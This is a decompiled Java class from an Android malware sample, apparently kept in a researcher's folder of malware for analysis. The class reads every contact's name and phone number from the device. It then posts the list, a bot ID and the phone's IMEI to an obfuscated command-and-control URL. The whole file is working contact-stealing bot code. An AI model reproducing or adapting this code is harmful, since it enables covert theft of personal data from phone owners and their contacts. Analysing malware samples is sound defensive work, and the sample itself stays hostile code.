import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import com.soft360.iService.AService;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.HttpParams;

final class dX
  implements Runnable
{
  dX(dU paramdU) {}
  
  public final void run()
  {
    Object localObject2 = AService.jdField_a_of_type_AndroidContentContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
    Object localObject4;
    for (Object localObject1 = "";; localObject1 = localObject1 + (String)localObject3 + "|||" + (String)localObject4 + "\n")
    {
      if (!((Cursor)localObject2).moveToNext())
      {
        localObject4 = new DefaultHttpClient();
        ((HttpClient)localObject4).getParams().setParameter("http.protocol.content-charset", "UTF-8");
        localObject2 = AService.jdField_a_of_type_AndroidContentContext.getString(2131165194);
      }
      try
      {
        localObject3 = this.a.a;
        localObject3 = new String(cD.a((String)localObject2));
        localObject2 = localObject3;
      }
      catch (Exception localException)
      {
        for (;;)
        {
          Object localObject3;
          localException.printStackTrace();
        }
      }
      localObject2 = new HttpPost(this.a.a(AService.jdField_a_of_type_Int) + (String)localObject2);
      try
      {
        localObject3 = new ArrayList();
        ((List)localObject3).add(new BasicNameValuePair("contact_list", (String)localObject1));
        ((List)localObject3).add(new BasicNameValuePair("bot_id", this.a.b()));
        localObject1 = this.a;
        ((List)localObject3).add(new BasicNameValuePair("imei", dU.a()));
        ((HttpPost)localObject2).setEntity(new UrlEncodedFormEntity((List)localObject3, "UTF-8"));
        ((HttpClient)localObject4).execute((HttpUriRequest)localObject2);
        return;
      }
      catch (IOException localIOException)
      {
        localIOException.printStackTrace();
        return;
      }
      catch (ClientProtocolException localClientProtocolException) {}
      localObject3 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("display_name"));
      localObject4 = ((Cursor)localObject2).getString(((Cursor)localObject2).getColumnIndex("data1"));
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dX.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */